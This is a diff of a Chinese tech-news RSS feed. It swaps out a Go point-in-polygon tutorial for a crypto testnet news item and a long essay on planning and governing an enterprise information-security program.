-&lt;p&gt;&lt;img src=&quot;https://img2022.cnblogs.com/blog/420532/202207/420532-20220711221230450-1951006409.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;思路： 这个最简单， 直接判断 y == Y，可以理解成穿过了这条边的2个顶点， Y是参考点的纵坐标， y是边的纵坐标。&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;p&gt;问题都解决了，其实并不复杂。&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h2&gt;实现代码&lt;/h2&gt;
-&lt;pre class=&quot;language-bash highlighter-hljs&quot;&gt;&lt;code&gt;type Point struct {
-X float64
-Y float64
-}
+<guid>ffe517253ec233d08fd3ce9fd0cf8c8e</guid>
+<title>上海市人民政府：支持龙头企业探索NFT交易平台建设 - BlockBeats</title>
+<link>https://toutiao.io/k/ttzfbbz</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;flash-items&quot; data-v-24db0c5c=&quot;&quot;&gt;&lt;p class=&quot;article-time&quot; data-v-24db0c5c=&quot;&quot;&gt;7小时前&lt;/p&gt;  &lt;p class=&quot;flash-items-content text-ellipsis3&quot; data-v-24db0c5c=&quot;&quot;&gt;BlockBeats 消息，7 月 14 日，Web3 存储方案 Bundlr Network 在社交媒体发文宣布正式启动测试网，本次测试网旨在完善未来的主网，测试节点交互情况和智能合约。用户参与测试网须拥有 Twitter 帐户，验证 Twitter 帐户后将收到参与测试网所需的测试 Token。Bundlr Network 将通过水龙头为每个帐户分配 2,500 个测试 Token。总共将有 10 亿个测试 Token，允许 400,000 个独立帐户加入测试网。
 
-func IfPointsInPolygon(point Point, area []Point) bool {
-// 目标点的x, y坐标
-x := point.X
-y := point.Y
+BlockBeats 此前报道，Bundlr Network 于今年 5 月宣布完成 520 万美元种子轮融资，该轮融资由 Framework Ventures、Hypersphere Ventures、Arweave Team 和 Permanent Ventures 共同领投，OpenSea 和 Race Capital 等参投。&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
+</item>
+<item>
+<guid>3e9b27629416b589918d950f06674dcf</guid>
+<title>企业安全建设实践路程思考</title>
+<link>https://toutiao.io/k/73fgie6</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;elementor-widget-container&quot;&gt;
 
-// 多边形的点数
-count := len(area)
+&lt;p&gt;在信息安全管理体系方面，有适用比较广的ISO27001标准簇，也有国标的网络安全等级保护制度，实践落地不是照搬，不与之作比较，&lt;strong&gt;侧重对实际繁琐工作实践进行提炼，备忘出具有普遍意义的方法论&lt;/strong&gt;，参考行业标准化的信息安全建设框架，结合特定场景下的实践落地过程，杂糅个人思考，力求避免过于强调技术语言，也尽量浅显易懂，谋求与同业之间引起共鸣和思考。&lt;/p&gt;
 
-// 点是否在多边形中
-var inInside bool
 
-// 浮点类型计算与0的容差
-precision := 2e-10
 
-// 依次计算每条边，根据每边两端点和目标点的状态栏判断
-for i, j := 0, count-1; i &amp;lt; count; j, i = i, i+1 {
-// 记录每条边上的两个点坐标
-x1 := area[i].X
-y1 := area[i].Y
-x2 := area[j].X
-y2 := area[j].Y
+&lt;p&gt;企业组织在进行信息安全建设规划时，“纵深防御”体系成为多数企业适用的架构参考，在其思想指导下，为了构建完善的安全防护体系和不断提升安全防护能力，对信息安全工作进行顶层架构设计和全面的规划布局属于第一要务。&lt;/p&gt;
 
-// 判断点与多边形顶点是否重合
-if (x1 == x &amp;amp;&amp;amp; y1 == y) || (x2 == x &amp;amp;&amp;amp; y2 == y) {
-return true
-}
 
-// 判断点是否在水平直线上
-if (y == y1) &amp;amp;&amp;amp; (y == y2) {
-return true
-}
 
-// 判断线段两端点是否在射线两侧
-if (y &amp;gt;= y1 &amp;amp;&amp;amp; y &amp;lt; y2) || (y &amp;lt; y1 &amp;amp;&amp;amp; y &amp;gt;= y2) {
-// 斜率
-k := (x2 - x1) / (y2 - y1)
+&lt;p&gt;&lt;strong&gt;关键词&lt;/strong&gt;：企业信息安全建设  安全建设实践  信息安全体系规划&lt;/p&gt;
 
-// 相交点的 x 坐标
-_x := x1 + k*(y-y1)
 
-// 点在多边形的边上
-if _x == x {
-return true
-}
 
-// 浮点类型计算容差
-if math.Abs(_x-x) &amp;lt; precision {
-return true
-}
+&lt;h3&gt;需求分析&lt;/h3&gt;
 
-// 射线平行于x轴，穿过多边形的边
-if _x &amp;gt; x {
-inInside = !inInside
-}
-}
-}
 
-return inInside
-}&lt;/code&gt;&lt;/pre&gt;
-&lt;pre class=&quot;language-bash highlighter-hljs&quot;&gt;&lt;code&gt;#压测
-/private/var/folders/9l/9h6c50j93qs8c43wpwnvhnbc0000gn/T/GoLand/___gobench_common_algorithm_polygon.test -test.v -test.paniconexit0 -test.bench . -test.run ^$
-goos: darwin
-goarch: amd64
-pkg: common/algorithm/polygon
-cpu: Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz
-BenchmarkPIP
-BenchmarkPIP-12    29140065        40.57 ns/op
-PASS&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt; &lt;/p&gt;
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;不仅仅是安全负责人，&lt;strong&gt;任一个员工都应该对企业本身所处行业、业务盈利模式、服务或产品、组织行事风格等具有一定程度的了解，这有助于信息安全人员从各方面对企业信息安全工作的目标进行理解&lt;/strong&gt;，因此能够从中发现所处行业的信息安全趋势、主要风险来源、业务对抗模式、落地的困难与阻力等等，同业交流、会议论坛、研究报告、产业白皮书等还有内部会议，都应该是本企业安全人员及时关注的信息安全发展来源。&lt;/p&gt;
+
+
+
+&lt;h4&gt;行业研究&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;假如建设初期我们对2019年的金融行业网络安全报告进行研究，可以发现当年其内容指出，预计2020年中国金融整体IT信息支出将超过215亿美元，针对金融领域的成功攻击可以迅速获得大量信息数据，让攻击者获得大量金钱收益，对于攻击者而言，金融服务行业是最大且最受欢迎的目标之一，等等诸多内容，行业研究报告是分析行业网络信息安全趋势的最佳来源。&lt;/p&gt;
+
+
+
+&lt;p&gt;而在FreeBuf咨询的2020-2021年对金融行业网络安全的研究报告中，通过行业调研和专家分享报告了新的理解和专业观察：&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;行业监管新动向，数据安全备受关注,数据安全与隐私保护成为金融监管的重点。&lt;/strong&gt;金融行业作为数据密集型行业，多样化的数据源、海量的数据存储量、复杂的数据格式和血缘关系，受到多项法律法规的合规要求（以数据安全法、个人信息保护法为主）；且数据泄露事件频发，在《数据泄露典型判例分析报告》中，针对所有与数据泄露相关的典型判例的150份裁判文书样本数据分析，发现内部人员泄露占数据泄露分布的80%，个人用户数据是数据泄露的主要类型。在严格且监管红线下，75%的企业最关注数据安全。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;实战与合规并重，攻防演练常态化，实战是检验安全的有效标准。&lt;/strong&gt;从国家部委到各省，甚至各行业，均开始以专项或全盘对抗方式进行周期性、常态化的进行攻防演练活动，通过演练来检验企业安全防护能力、安全保障能力和应急处置水平。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;发现同行业的安全建设现状，成为建设目标的最有利参考。&lt;/strong&gt;网络安全成为金融行业信息技术体系的重要职能部门，86.3%的企业具备安全团队或设置了具有安全职能的岗位，91%的企业由信息科技领导直接负责安全部门，且在持续增加网络安全方面的投入，有47%的企业安全投入占据IT总预算的3%-10%，24%的企业达到10%-15%。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;金融行业风险变得聚焦，内控风险、外包风险、新型漏洞攻击、数据安全威胁、员工行为安全问题等。&lt;/strong&gt;大部分企业在安全建设中存在的主要困难点突出有安全预算有限、安全人员较少且缺乏专业度、市场厂商产品及服务有待提高、安全建设在企业内不受领导重视等。&lt;/p&gt;
+
+
+
+&lt;h4&gt;企业剖析&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;除了研究机构对行业的研究分析、同业的研究报告外，我们仍可以自观企业经营的营销重点、业务方向、服务及产品方式，有的放矢去理解企业信息安全的治理方面仍未明了的需求。例如某互联网大数据企业，业务经营以公共市场数据挖掘和科学分析为主，因此需要使用社会公共数据资源目录，在对接主管部门、大数据局等政务部门进行数据开放的数据处理使用，需满足政务数据主管和监管对数据保护的安全能力需求。&lt;/p&gt;
+
+
+
+&lt;p&gt;作为数据开放的使用方，需要梳理国家法规要求，如网络安全等级保护要求、数据安全法、个人信息保护法、各省公共数据开放与共享的安全管理相关办法及行业监管要求。如果以数据为业务服务，经营数据、用户数据的安全管控是业务发展内生的安全需求，也是最重要的需求；且业务服务以SaaS及APP为主，为保障业务的连续性、安全可用，以及防止数据泄露、网络攻击，业务安全、云安全、APP合规等也是保障业务发展的直接需求，同样需要重点考虑。&lt;/p&gt;
+
+
+
+&lt;h4&gt;方向分析&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;经过对科技公司通过行业趋势、同业实践现状和企业自身经营特点等其他各方面进行分析，快速发现企业安全建设的初步需求重点。因此初步可以将其简单归纳并梳理以下几条，在安全建设中需特别注意的方向（特定场景示例不与对照）：&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;合规建设要求加强&lt;/strong&gt;，2019年8月中国人行印发的《金融科技(FinTech)发展规划(2019-2021)》中指出，金融科技将成为防范化解金融风险的新利器，因此对相关行业进行合规、技查双管齐下。同时需要结合公安部主导新制定的网络安全等级保护标准（即等保2.0），全方位关注网络、数据、人员等多个维度，构建“一个中心、三重防护、全面管理”的一体化安全架构。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;数据安全成为信息安全的重点&lt;/strong&gt;，2019年CNCERT漏洞统计中涉及信息泄露的漏洞占76%，上升为最热门漏洞，不断发生的数据泄露事件和处罚案例，数据作为一种新型生产要素写入中央文件，数据安全相关法规颁布（数据安全法和个人信息保护法），都进一步督促企业需要完善数据安全治理工作。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;信息安全风险呈现多样化&lt;/strong&gt;，APT、系统0day漏洞、恶意勒索、内部人员数据泄漏等仍是信息安全所面临主要风险，网络钓鱼、拖库撞库、勒索/挖矿、数据泄露、撸羊毛等恶意行为仍是重灾区，新的攻击技术的应用，不断涌现的0day，使安全风险更难以识别难以预测。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;人员安全是绕不开的话题&lt;/strong&gt;，日常安全运营的安全事故中只有20％～30％是由于系统漏洞或其他外部原因造成，70％～80％是由于内部员工的疏忽或有意泄密造成的，因此，安全建设中人的因素比信息安全技术和平台系统的因素更重要。同时安全人才的缺乏和安全意识不足，仍是导致密码问题、网络钓鱼、误操作或无意识泄密的重要原因。&lt;/p&gt;
+
+
+
+&lt;h3&gt;建设规划&lt;/h3&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;h4&gt;树立正确的认知&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;信息安全管理作为公司级治理任务，不单是信息安全部门的工作，也不仅仅视为技术建设项目，是在公司信息科技战略指导下，为确保业务连续性和风险安全可控状态，多个部门协作实施的一系列活动。信息安全建设需要协调管理层、执行层、监督层等相关方，破解不同部门之间的沟通障碍，统一内部共识，实现安全管理建设一盘棋。因此需要跨部门协同，在公司层面、部门之间建立共识，树立正确的信息安全价值观。在行业实践中具有通用的安全共识方法论，可以指导我们树立正确的信息安全价值观。&lt;/p&gt;
+
+
+
+
+
+
+
+&lt;h4&gt;建立明确的蓝图&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;企业安全建设必须要有明确的未来蓝图，指示出未来建设的总体框架。围绕在企业章程和经营业务目标下，着手搭建总体信息安全方针政策，明确信息安全的人员组织、工作思路、任务和重点，以及优化提升的建设原则，才能最终建立科学、合理、有效的信息安全管控体系。依照同业参考标准和实践经验，同样可以参考国际标准框架，制定属于本企业的信息安全蓝图，如下通过提炼出的信息安全体系全景图，总览信息安全管理体系。&lt;/p&gt;
+
+
+
+
+
+
+
+&lt;p&gt;&lt;span class=&quot;has-inline-color has-very-dark-gray-color&quot;&gt;&lt;strong&gt;信息安全体系的建设，必须以经营业务为导向，以合规监管为底线，以治理管控为策略，基于企业能力现状因素，充分参考行业实践，建立符合企业最大收益化的安全建设路线。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+
+
+
+&lt;p class=&quot;has-normal-font-size&quot;&gt;良好的信息安全体系的指导思想是，信息安全不仅仅为公司经营业务服务，更应该成为企业提供的服务（或产品）的最重要属性，成为赋能业务或者企业服务（或产品）价值体现的重要指标之一。&lt;/p&gt;
+
+
+
+&lt;p&gt;作为企业保持业务连续性和风险可控的主要风险管理工作，信息安全建设应以企业全面风险管理为指导框架，以风险管理的思维，坚持合法依规的红线和底线，在业务扩张转向成熟过程中，逐渐调整安全治理管控的侧重点，建立充分的指导方针和原则，助推信息安全的建设有效落地，只因安全与风险密不可分。&lt;/p&gt;
+
+
+
+&lt;p&gt;信息安全建设的平稳推进，依赖企业信息科技的投入资源、对风险的接受偏好，以及对管理体系的借鉴参考，特别是专业的信息安全管理人员的架构能力。作为专业的信息安全架构师，意味着需要了解主流的信息安全建设“最佳实践”，同时具有打破和知道何时打破“最佳实践”的能力，避免信息安全建设过程的踩坑，在行业标准化实践经验的指导下，平衡投入与收益，建立符合企业利益最大化的良好实践。&lt;/p&gt;
+
+
+
+&lt;h4&gt;开展信息安全规划&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;信息安全规划是企业信息化发展战略的基础性工作，非可有可无的。由于各企业处于不同阶段，信息化的任务与目标不同，所以信息安全建设规划包括的内容不同，建设规模就有很大差异，因此，信息安全规划的落地推进无法从专业书籍或研究资料中找到有针对性的帮助，也不可能给出一个标准化的信息安全规划模版。在这里提出的信息安全规划框架与方法，给出了信息安全规划工作的一种建设原则、建设内容、建设思路，具体规划落地还需要深入细致地进行企业本地化的调查与研究，结合实际情况落到实处。&lt;/p&gt;
+
+
+
+&lt;p&gt;信息安全建设规划的最终效果应是体现在保障业务连续和信息系统及资源的安全可控层面，应该是明确安全建设的规划目标、框架、任务和行动路线等内容，防止盲目建设，因此建设规划应围绕着信息安全工作的明确路线进行开展。如下为例可以有以下几方面工作：&lt;/p&gt;
+
+
+
+&lt;h5&gt;1、战略规划&lt;/h5&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;对信息安全建设的规划需要从信息化（信息科技建设）的战略入手，深入理解企业信息化发展的总体目标和各阶段实施目标，以此来制定信息安全的规划目标，保持与信息化的同步，来保障未来信息安全战略的有效落地执行。&lt;/p&gt;
+
+
+
+&lt;p&gt;– 了解企业发展战略&lt;/p&gt;
+
+
+
+&lt;p&gt;– 了解信息化发展方向和战略构想&lt;/p&gt;
+
+
+
+&lt;p&gt;– 了解信息化建设的挑战&lt;/p&gt;
+
+
+
+&lt;p&gt;– 理解信息化建设规划&lt;/p&gt;
+
+
+
+&lt;p&gt;– 理解经营业务需求&lt;/p&gt;
+
+
+
+&lt;p&gt;– 理解信息安全价值和意义&lt;/p&gt;
+
+
+
+&lt;p&gt;– 研究技术趋势&lt;/p&gt;
+
+
+
+&lt;p&gt;– 确定信息安全战略&lt;/p&gt;
+
+
+
+&lt;h5&gt;2、提出建设目标&lt;/h5&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;对信息科技的工作现状进行整体的、综合的、全面的现状分析，找出以往工作中优势与不足，开展信息安全需求分析，根据信息化的建设目标进行分解，提出未来几年的信息安全需求，制定信息安全框架体系，明确信息安全建设的远景目标和重点方向。&lt;/p&gt;
+
+
+
+&lt;p&gt;– 开展信息安全需求分析&lt;/p&gt;
+
+
+
+&lt;p&gt;– 理解运维管理体系&lt;/p&gt;
+
+
+
+&lt;p&gt;– 制定建设规划框架&lt;/p&gt;
+
+
+
+&lt;p&gt;– 制定重要计划方向、重点任务&lt;/p&gt;
+
+
+
+&lt;p&gt;– 梳理内外部合规需求清单：法律法规、主管监管、隐私保护&lt;/p&gt;
+
+
+
+&lt;p&gt;– 理解内外部信息安全需要：&lt;/p&gt;
+
+
+
+&lt;blockquote class=&quot;wp-block-quote&quot;&gt;&lt;p&gt;数据安全保护（如防泄漏、用户个人敏感信息保护）&lt;/p&gt;&lt;p&gt;外部攻击防护（如业务风控）&lt;/p&gt;&lt;p&gt;内部管理控制&lt;/p&gt;&lt;p&gt;…&lt;/p&gt;&lt;p&gt;确定未来3年信息安全建设目标和核心重点工作&lt;/p&gt;&lt;/blockquote&gt;
+
+
+
+&lt;p&gt;如下为例的信息安全建设指导方针：&lt;/p&gt;
+
+
+
+&lt;blockquote class=&quot;wp-block-quote&quot;&gt;&lt;p&gt;以数据安全为导向&lt;/p&gt;&lt;p&gt;以整体安全为目标&lt;/p&gt;&lt;p&gt;以领先实践为标准&lt;/p&gt;&lt;/blockquote&gt;
+
+
+
+&lt;p&gt;旨在强调信息安全体系建设与企业经营业务类型、以及业务发展阶段同步，尽可能整体、全面的建设安全防护手段（不推荐，可能导致过度投入），且满足与行业良好实践同步。&lt;/p&gt;
+
+
+
+&lt;h5&gt;3、制定行动路线&lt;/h5&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;以信息安全目标为中心，结合企业偏好、业务场景和风险威胁情况，构建可持续运转的闭环安全防护体系，实现组织安全能力建设。将信息安全目标分解成若干小的建设项，以便于今后的落实与实施。&lt;/p&gt;
+
+
+
+&lt;p&gt;– 理解基础网络和信息系统架构、主要技术选型&lt;/p&gt;
+
+
+
+&lt;p&gt;– 了解市场解决方案、前沿开源技术&lt;/p&gt;
+
+
+
+&lt;p&gt;– 借鉴行业良好实践&lt;/p&gt;
+
+
+
+&lt;p&gt;– 资源评估（成本预算、人力、配合环境）&lt;/p&gt;
+
+
+
+&lt;p&gt;– 风险评估：（发展阶段、重点目标、）现状分析和需求适配&lt;/p&gt;
+
+
+
+&lt;p&gt;– 确定建设路线：可研方案论证、PPT（人+流程+技术平台）、治理运营（风险防御、监控预警、应急处置、溯源分析、对抗）、持续改进（衡量体系、第三方评估）&lt;/p&gt;
+
+
+
+&lt;p&gt;– 确定年度实施计划（明确年度建设内容、投入方式、人力与资源、价值标准）&lt;/p&gt;
+
+
+
+&lt;p&gt;以下方法论示例供参考：&lt;/p&gt;
+
+
+
+
+
+
+
+&lt;p&gt;人的评估，高管层属于经济利益型还是专业背景型？风险管理属于保守型还是激进型？没有红头文件、没有监管通报、没有罚款，一概不做？既要马儿跑又要马儿不吃草，利用开源项目、免费白嫖？&lt;/p&gt;
+
+
+
+&lt;h4 class=&quot;has-vivid-red-color has-text-color&quot;&gt;建设指导原则&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt;&lt;strong&gt;明确业务导向&lt;/strong&gt;，保障信息安全与业务目标的一致性&lt;/li&gt;&lt;li&gt;&lt;strong&gt;聚焦核心基础安全能力&lt;/strong&gt;，有重点分阶段低成本的分步走&lt;/li&gt;&lt;li&gt;&lt;strong&gt;把控投入节奏&lt;/strong&gt;，追求投入与收益的平衡，不过度保护，有差别的对待安全风险&lt;/li&gt;&lt;li&gt;&lt;strong&gt;追求安全的收益&lt;/strong&gt;，安全成为对业务和企业有益的价值体现，做的好也要讲得好&lt;/li&gt;&lt;li&gt;&lt;strong&gt;以领先实践为标准，&lt;/strong&gt;向同业看齐，努力超越竞对&lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;p&gt;信息安全规划作为企业战略在信息安全方面的落实和扩展，是以企业整体发展战略、信息化规划为基础，考虑外部合规、内部管控需要，诊断、分析、评估企业信息安全差距和需求，并结合信息安全最佳实践以及发展趋势，总结和提出企业信息安全建设的远景、目标、框架、任务和行动路线的过程（续建设规划与需求实践思考）。&lt;/p&gt;
+
+
+
+&lt;h3&gt;建设模型&lt;/h3&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;h4&gt;漏斗Y模型&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;信息安全建设的这个漏斗“Y模型”方法本身很直观，自上而下规划、分析，自上而下推动，自下而上设计、实施、完善（参考首篇&lt;a rel=&quot;noreferrer noopener&quot; href=&quot;https://www.freebuf.com/articles/articles/es/282463.html&quot; target=&quot;_blank&quot;&gt;建设规划与需求实践思考&lt;/a&gt;，时间仓促，也算是承诺的续吧）。&lt;/p&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;h4&gt;方针&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;一个目标、两个方向、三个维度&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;建设目标：&lt;/p&gt;
+
+
+
+&lt;p&gt;按照特定意义场景下的信息安全体系发展阶段，打造“可防、可见、可控、可审、可信”的信息安全管理体系。&lt;/p&gt;
+
+
+
+&lt;p&gt;两个方向：&lt;/p&gt;
+
+
+
+&lt;p&gt;对外保障边界安全和业务安全&lt;/p&gt;
+
+
+
+&lt;p&gt;对内提升全员安全意识&lt;/p&gt;
+
+
+
+&lt;p&gt;三个维度：&lt;/p&gt;
+
+
+
+&lt;p&gt;管理建设维度，打造特色的业务与数据安全体系管理建设闭环体系&lt;/p&gt;
+
+
+
+&lt;p&gt;管控能力维度：建设全面的信息安全管控能力&lt;/p&gt;
+
+
+
+&lt;p&gt;安全运营维度：建立一套完善的安全运营管理流程&lt;/p&gt;
+
+
+
+
+
+
+
+&lt;h4 class=&quot;has-vivid-red-color has-text-color&quot;&gt;改进思维&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;动态纠偏思维&lt;/strong&gt;：动态纠偏来自于PDCA不断迭代的思想，由某厂商市场总监提出，信息安全规划不是一成不变的，需要根据企业发展现状、信息化投入重点、建设周期、技术成熟度等进行合理调整，如某些子项的重要程度和顺序，使建设方案按照建设目标以最优的平衡实现最大化收益，“一以贯之、动态纠偏”。但应该坚持短期规划的一贯性原则，除非重大变故不建议进行推倒重建，避免因规划思想的不同而导致的重复建设和资源浪费。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;差异化原则&lt;/strong&gt;（反木桶原理）：“木桶原理”，信息安全防护水平由最短的那块木板决定，是信息安全体系中最重要的一种建设思维，从防御维度来看的确如此。但从安全建设角度，按照最高规格的安全方案来建设，意味着安全强烈的主导性、大量的成本投入、复杂的管理程序、高难度的阻力，甚至阻碍业务的发展。建设方案应该充分考虑业务特性、适用场景、平衡风险与收益，有区别的针对性建设，打破实践重新塑造最优方案。&lt;/p&gt;
+
+
+
+&lt;h3&gt;建设内容&lt;/h3&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;h4&gt;管理建设维度&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;业务与安全体系建设，可以按照标准“规划、建设、监督检查、持续改进”的方式开展信息安全建设工作，形成PDCA闭环，持续提升信息安全管理能力。&lt;/p&gt;
+
+
+
+&lt;p&gt;“戴明环”PDCA（计划Plan、执行Do、检查Check、处理Action）是一个持续改进模型，把各项工作按照作出计划、计划实施、检查实施效果，然后将具有成效的措施纳入标准流程，不匹配的方法去掉或者留待下一个循环去解决，形成一套螺旋上升不断改进的工作方法。&lt;/p&gt;
+
+
+
+&lt;p&gt;假设一家初创企业，业务与安全体系建设都属于起步阶段，这意味着可以避免很多业务发展与安全建设的不平衡问题，可以严格按照标准流程从头建设属于自己的管理体系；如果业务成熟的企业，新增安全建设，便需要在一个特定阵痛期内，不断打破原有的管理流程，不断完善安全管理措施，斧正不规范的管理行为。&lt;/p&gt;
+
+
+
+
+
+
+
+&lt;p&gt;管理建设维度有两项重要的工作，即制度建设和评估审计。管理建设必须有完善的制度体系作为指导，形成制度、规范、方法等有层级的规范文件，在管理过程中才能“有依据、有目标、有方法”；而制度规范的落地执行，必须要依靠风险评估和管理审计，有理有据有效执行，达到目标效果。&lt;/p&gt;
+
+
+
+&lt;h4&gt;管控能力维度&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;在内部管控方面建立一套完整的信息安全管控体系，包括基础网络安全、办公终端安全、数据安全、应用安全、管理安全等，按照PPT（人+流程+技术）系统工程，投入人员配置，设置过程和方法，建设技术平台工具，形成纵深的安全管控体系（技术体系不在此详述，实例为不完全参考）。&lt;/p&gt;
+
+
+
+
+
+
+
+&lt;h4&gt;安全运营维度&lt;/h4&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;根据信息安全事件防护、监测、预警、响应、恢复的机制，建立一套完整的安全运营管理流程，按照“事前、事中、事后”进行防护要求建设，达到及时响应恢复的目的，应对未来可能出现的各类信息安全事件。&lt;/p&gt;
+
+
+
+
+
+
+
+&lt;p&gt;分阶段实施，进入持续运营不断优化阶段，通过安全运营积累，实现标准化、可量化。&lt;/p&gt;
+
+
+
+&lt;h3&gt;实践挑战&lt;/h3&gt;
+
+
+
+&lt;p/&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;体系架构设计缺乏&lt;/strong&gt;，对新技术的追捧，以及技术建设往平台化发展，常常认为以态势感知、XDR、综合管控平台等基础安全设备的采购、运维，作为主要信息安全体系建设目标。在安全管理体系方面没有概念，无法将业务风控、审计、法务合规、行政管理、物理安全、隐私保护等范围与信息安全的关系进行充分明确。建设了很多平台系统，依然没有成熟的管理体系，工作机制仍旧一团糟。未能掌握对公司战略目标和发展的分析，没有体系化的建设目标。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;合规管理认知不准确&lt;/strong&gt;，对合规的认知，仅仅停留在无监管通报即为安全的层面，根本未理解信息安全合规的初衷，以至于将等保、ISO27001等认为即是没用的一堆文档，形同虚设，常常有“合规都是虚的”观念。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;人员短缺，&lt;/strong&gt;在现阶段信息安全领域，有经验的顶层架构设计架构师过于缺乏，跟信息安全行业的发展以及人才的培养时间有关，市场还未历练出大批优秀的安全人才（历经业务生产和信息安全的双重历练）。国家战略的高度重视，资本的引入，未来的信息安全需求加强，都会推动行业的发展。企业对信息安全人才需求强烈，高级人才的短缺，但市场评价体系未有标准，无法支付安全行业的标准高薪，要么通过运维人员自行培养，或全部依赖外部服务商公司，但服务商的方法论体系并不一定适合实际落地执行。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;预算不足，&lt;/strong&gt;虽然在某些行业“十四五”规划中提到关键行业信息安全投入不得低于IT的10%，但大多数企业信息安全方面的投入仍不足5%，甚至没有基础的规划建设内容。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;对新技术投入艰难，&lt;/strong&gt;新技术的细分赛道，鱼龙混杂，想要根据行业技术发展趋势，利用好现有行业内成熟方案，‘不吃新螃蟹’，但又要对未来技术发展具有前瞻性，何其艰难。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;成本投入管理难以体现，&lt;/strong&gt;信息安全从未有与信息系统“同步规划、同步建设”的地位，信息安全作为企业内的后来者，无疑要抢占整体信息化建设的投入，且收益比量化没有较好的标准，导致多数企业在信息安全方面的成本投入整体偏保守。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;向上管理任务艰巨，&lt;/strong&gt;企业安全建设或者运营作为一项长期性工作，不能忽视与领导层之间的沟通，包括合理的预算投入、建设的必要性、安全运营价值体现等，同时不能无视跨部门带来的价值，比如对风险合规的有效支撑、对企业数字营销价值的体现、对日常经营管理的支持。在标准的组织架构内，治理领导层向管理执行层下达的目标是清晰的，而由下向上推动的建设活动，常常困难与阻力重重，无法得到应有的资源和协调。因此，以非专业的语言，向领导层展示和汇报信息安全管理的价值收益至关重要。&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;人员安全意识的提升，难上加难。&lt;/strong&gt;在所有的信息安全建设，以及安全运营过程中，众所周知，人的因素的重要性，但如何开展员工安全意识的提升，有各种方式方法，但苦于收效甚微，频繁的人员变动、复杂的外包及供应链环境，安全意识提升的脚步无法停下（以后详述实践）。&lt;/p&gt;
+
+
+
+&lt;p&gt;作者：两块&lt;/p&gt;
+
+
+
+&lt;p/&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;/div&gt;</content:encoded>
 </item>
 <item>
-<guid>d2990ce97a19229ded210d244ea4130d</guid>
-<title>不知道怎么解耦业务？Spring Event 了解一下！</title>
-<link>https://toutiao.io/k/tn4ht3k</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.46511627906976744&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/JdLkEI9sZffKoCHYjuTAgaruumgjr8M1huQ66CRrqRvuc6AnBuekF6F7MqOMCvsCPRToT2jCiccQsFJwXTTHr7w/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;645&quot;/&gt;&lt;/section&gt;&lt;hr data-tool=&quot;mdnice编辑器&quot;/&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;写在最前&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;实际业务开发过程中，业务逻辑可能非常复杂，核心业务 + 